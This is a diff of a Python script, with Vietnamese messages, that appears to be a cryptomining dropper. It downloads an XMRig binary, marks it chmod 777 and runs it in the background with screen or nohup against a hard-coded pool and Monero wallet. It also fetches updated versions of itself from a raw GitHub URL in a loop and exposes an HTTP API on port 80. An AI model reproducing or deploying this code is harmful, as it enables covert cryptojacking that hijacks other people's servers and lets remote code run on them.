@@ -14,7 +14,7 @@ elif platform == "darwin":
 elif platform == "win32":
     operate_system = 'win'
 #cores = multiprocessing.cpu_count()
-#cores = int(cores) / 2
+#cores = cores - 1
 #if cores <= 0:
 #    cores = 1
 timeout = 30
@@ -30,23 +30,28 @@ if operate_system == 'lin':
     except:
         pass
     try:
+        os.system('apt-get install -y python3-setuptools')
+        os.system('python3 -m easy_install install pip')
+    except:
+        pass
+    try:
         os.system('pip install psutil')
         os.system('pip3 install psutil')
     except:
         pass
 import psutil
-#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --http-host=0.0.0.0 --http-port=80 -t %s' %cores
-#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.vps_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
 command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
-
+#command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80 -t %s' %cores
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
     print(working_dir)
     path_app = os.path.realpath(__file__)
-    version_chinh = 5.0
-    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_chinh'
-    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_cpu.py'
+    version_chinh = 5.3
+    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_vps_cpu'
+    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/vps_cpu.py'
     try:
         response = requests.get(link_version_chinh, timeout=timeout)
         get_version_chinh = float(response.text)
@@ -98,8 +103,8 @@ while True:
                 os.system('wget %s' %link_download_xmrig)
                 os.system('tar xf %s' %gz_name)
                 os.chdir('/opt/%s' %folder_xmrig)
+                os.system('cp xmrig %s' %xmrig_name)
                 #workingdir = os.getcwd()
-                os.system('mv xmrig %s' %xmrig_name)
                 os.system('chmod 777 %s' %xmrig_name)
             else:
                 print('Da co chuong trinh %s' %xmrig_name)
@@ -141,17 +146,21 @@ while True:
                     break
         except:
             pass
-        if xmrig_dachay == False:
-            command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, command_xmrig_default)
-            print(command)
-            if os.path.isfile('/usr/bin/screen'):
-                print('Co chuong trinh screen')
-                os.system ('screen -dmS %s %s' %(xmrig_name, command))
-            elif os.path.isfile('/usr/bin/nohup'):
-                print('Co chuong trinh nohup')
-                os.system ('nohup %s &' %command)
-            else:
-                os.system ('%s &' %command)
+
+        try:
+            if xmrig_dachay == False:
+                command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, command_xmrig_default)
+                print(command)
+                if os.path.isfile('/usr/bin/screen'):
+                    print('Co chuong trinh screen')
+                    os.system ('screen -dmS %s %s' %(xmrig_name, command))
+                elif os.path.isfile('/usr/bin/nohup'):
+                    print('Co chuong trinh nohup')
+                    os.system ('nohup %s &' %command)
+                else:
+                    os.system ('%s &' %command)
+        except:
+            pass
 
         '''
         #pkt
